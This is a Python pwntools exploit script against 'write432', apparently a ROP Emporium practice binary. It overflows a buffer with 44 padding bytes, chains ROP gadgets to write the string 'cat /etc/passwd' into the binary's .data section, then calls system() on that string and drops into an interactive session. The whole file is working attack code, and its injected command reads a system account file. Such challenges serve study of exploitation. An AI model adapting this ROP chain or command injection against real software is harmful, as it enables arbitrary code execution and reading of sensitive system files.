from pwn import *



def writeStringToLocation(inputString, location):
    if len(inputString) % 4 == 0:
        inputString += "\x00" * 4
    else:
        inputString += (4-(len(inputString)%4)) * "\x00"

    payload = ""
    for i in xrange(0,len(inputString),4):
        payload += p32(pop_edi_pop_ebp)
        payload += p32(location+i)
        payload += inputString[i:i+4]
        payload += p32(mov_edi_ebp)

    return payload

e = ELF("./write432")


crap = "A" * 44


data_section = e.get_section_by_name(".data").header.sh_addr
system_call = e.symbols["usefulFunction"]+14
mov_edi_ebp = e.symbols["usefulGadgets"]
pop_edi_pop_ebp = 0x080486da # TODO: make this address relative rather than absolute




payload = crap
payload += writeStringToLocation("cat /etc/passwd",data_section)

payload += p32(system_call)

payload += p32(data_section)




io = e.process()


io.sendline(payload)

io.interactive()
